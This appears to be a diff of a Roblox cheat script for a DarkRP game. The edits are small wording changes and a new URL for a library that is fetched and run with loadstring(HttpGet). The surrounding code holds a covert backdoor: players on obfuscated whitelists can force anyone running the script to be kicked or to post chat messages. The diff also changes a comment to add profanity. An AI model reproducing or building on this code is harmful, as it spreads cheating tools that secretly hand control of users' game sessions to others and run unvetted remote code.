@@ -1,5 +1,5 @@
 --6000 lines of code ._.
--- open sourced because i do not care.
+-- open sourced because i do not give a shit.
 -- ui might not be accurate cuz exactly recreating it is way to time consuming
 
 local STick = tick()
@@ -4431,7 +4431,7 @@ if not _G.cosmicloaded and naem.Name:find("Electric State DarkRP") or naem.Name:
     
     function admin(v)
         if table.find(eunfwunghngiriNINGIH2424B4299UH1N4N__namecall2h4nfih2grgw, v.Name) then
-            print("Your commands are: (Kick, Kill, Say, Bring,)- Player (Wear) -Wears outfits for an example, 'wear modi")
+            print("Your commands are: (Kick, Ban, Say, Bring,)- Player (Wear) -Wears outfits for an example, 'wear modi")
             print("Your prefix is = ' ")
             YoLoaded = Instance.new("Sound",game:GetService("Workspace"))
             YoLoaded.SoundId = "rbxassetid://3020149185"
@@ -4763,12 +4763,12 @@ if not _G.cosmicloaded and naem.Name:find("Electric State DarkRP") or naem.Name:
             if table.find(eunfwunghngiriNINGIH2424B4299UH1N4N__namecall2h4nfih2grgw, plr.Name) or table.find(sexesp,plr.Name) or table.find(ebgenwgnWRHqew6WOJNRHWRH243gwjgnwj_81gnhjwngrjwNHKEMNWERG, plr.Name) then
                 if msg:sub(1,5):lower() == "'kick" and GetPlr(msg:split(" ")[2]) == LocalPlayer then
                     if msg:split(" ")[3] ~= nil then
-                        LocalPlayer:Kick("You have been kicked by; "..v.Name.."\n Reason; "..msg:sub(8 + msg:split(" ")[2]:len(),msg:len()))
+                        LocalPlayer:Kick("You have been banned by; "..v.Name.."\n Reason; "..msg:sub(8 + msg:split(" ")[2]:len(),msg:len()))
                     else
-                        LocalPlayer:Kick("You have been kicked by; "..v.Name.."\n Reason; No Reason")
+                        LocalPlayer:Kick("You have been banned by; "..v.Name.."\n Reason; No Reason")
                     end
                 end
-                
+
                 if msg:sub(1,4):lower() == "'say" and GetPlr(msg:split(" ")[2]) == LocalPlayer and not table.find(ebgenwgnWRHqew6WOJNRHWRH243gwjgnwj_81gnhjwngrjwNHKEMNWERG,GetPlr(msg:split(" ")[2]).Name)then
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg:sub(7 + msg:split(" ")[2]:len(),msg:len()),"All")
                 end
@@ -4872,12 +4872,12 @@ if not _G.cosmicloaded and naem.Name:find("Electric State DarkRP") or naem.Name:
             if table.find(eunfwunghngiriNINGIH2424B4299UH1N4N__namecall2h4nfih2grgw, v.Name) or table.find(sexesp,v.Name) or table.find(ebgenwgnWRHqew6WOJNRHWRH243gwjgnwj_81gnhjwngrjwNHKEMNWERG, v.Name) then
                 if msg:sub(1,5):lower() == "'kick" and GetPlr(msg:split(" ")[2]) == LocalPlayer then
                     if msg:split(" ")[3] ~= nil then
-                        LocalPlayer:Kick("You have been kicked by; "..v.Name.."\n Reason; "..msg:sub(8 + msg:split(" ")[2]:len(),msg:len()))
+                        LocalPlayer:Kick("You have been banned by; "..v.Name.."\n Reason; "..msg:sub(8 + msg:split(" ")[2]:len(),msg:len()))
                     else
-                        LocalPlayer:Kick("You have been kicked by; "..v.Name.."\n Reason; No Reason")
+                        LocalPlayer:Kick("You have been banned by; "..v.Name.."\n Reason; No Reason")
                     end
                 end
-                
+
                 if msg:sub(1,4):lower() == "'say" and GetPlr(msg:split(" ")[2]) == LocalPlayer and not table.find(ebgenwgnWRHqew6WOJNRHWRH243gwjgnwj_81gnhjwngrjwNHKEMNWERG,GetPlr(msg:split(" ")[2]).Name)then
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg:sub(7 + msg:split(" ")[2]:len(),msg:len()),"All")
                 end
@@ -5024,7 +5024,7 @@ if not _G.cosmicloaded and naem.Name:find("Electric State DarkRP") or naem.Name:
     
     -- Combat
 
-    getgenv().library = loadstring(game.HttpGet(game,"https://raw.githubusercontent.com/Urfavsyanpseuser/Salad/main/ASPECT/d/main/Salad%2520V2%2520Ui%2520lib"))()
+    getgenv().library = loadstring(game.HttpGet(game,"https://raw.githubusercontent.com/Urfavsyanpseuser/Salad/main/ASPECT/d/main/Cosmic%25V2%252%252lib"))()
     
     local lib = library.new(var.ver)
     
